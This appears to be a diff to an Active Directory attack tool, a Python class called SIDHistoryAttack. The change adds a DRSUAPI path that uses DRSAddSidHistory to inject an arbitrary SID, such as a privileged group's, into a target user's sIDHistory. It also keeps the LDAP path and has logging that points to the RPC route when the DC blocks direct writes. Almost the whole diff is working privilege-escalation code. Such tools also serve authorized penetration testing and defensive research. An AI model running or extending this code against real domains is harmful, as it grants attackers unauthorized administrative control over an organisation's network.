@@ -198,15 +198,20 @@ class SIDHistoryAttack:
             return False
 
         try:
-            user_dn = self.ldap_ops.get_object_dn(target_user)
-            if not user_dn:
-                return False
-
             # Check if already present
             current = self.ldap_ops.get_sid_history(target_user)
             if sid_to_add in current:
                 logging.warning(f"SID {sid_to_add} already in sIDHistory")
                 return True
+
+            # DRSUAPI method - use RPC DRSAddSidHistory
+            if method == self.METHOD_DRSUAPI:
+                return self._add_sid_via_drsuapi(target_user, sid_to_add)
+
+            # LDAP method
+            user_dn = self.ldap_ops.get_object_dn(target_user)
+            if not user_dn:
+                return False
 
             success = self.ldap_ops.add_sid_to_history(user_dn, sid_to_add)
 
@@ -215,13 +220,49 @@ class SIDHistoryAttack:
                 logging.info(f"Added {sid_to_add} ({name}) to {target_user}'s sIDHistory")
             else:
                 logging.error("LDAP add failed - the DC likely blocks direct sIDHistory writes")
-                logging.error("Try: --method drsuapi (for cross-forest injection)")
+                logging.error("Try: --method drsuapi (for RPC-based injection)")
 
             return success
 
         except Exception as e:
             logging.error(f"Error adding SID to history: {e}")
             return False
+
+    def _add_sid_via_drsuapi(self, target_user: str, sid_to_add: str) -> bool:
+        """Add a SID via DRSUAPI DRSAddSidHistory using a synthetic source."""
+        if not self.drsuapi_client:
+            logging.info("Establishing DRSUAPI connection...")
+            if not self.connect_drsuapi():
+                logging.error("Cannot connect to DRSUAPI")
+                return False
+
+        # DRSAddSidHistory needs src_domain + src_principal
+        # For same-domain preset injection, we use the domain itself as source
+        src_domain = self.domain
+        dst_domain = self.domain
+
+        # Resolve the SID to a sAMAccountName for the source principal
+        src_principal = self.ldap_ops.get_name_by_sid(sid_to_add)
+        if not src_principal:
+            logging.error(f"Cannot resolve SID {sid_to_add} to a source principal")
+            return False
+
+        logging.info(f"DRSAddSidHistory: {src_principal}@{src_domain} -> {target_user}@{dst_domain}")
+
+        success, error_code, error_msg = self.drsuapi_client.add_sid_history(
+            src_domain=src_domain,
+            src_principal=src_principal,
+            dst_domain=dst_domain,
+            dst_principal=target_user,
+        )
+
+        if success:
+            name = SIDConverter.resolve_sid_name(sid_to_add, self.domain_sid)
+            logging.info(f"Added {sid_to_add} ({name}) to {target_user}'s sIDHistory via DRSUAPI")
+        else:
+            logging.error(f"DRSAddSidHistory failed: {error_msg} (code: {error_code})")
+
+        return success
 
     def add_sid_preset(self, target_user: str, preset_name: str,
                        method: str = METHOD_LDAP) -> bool:
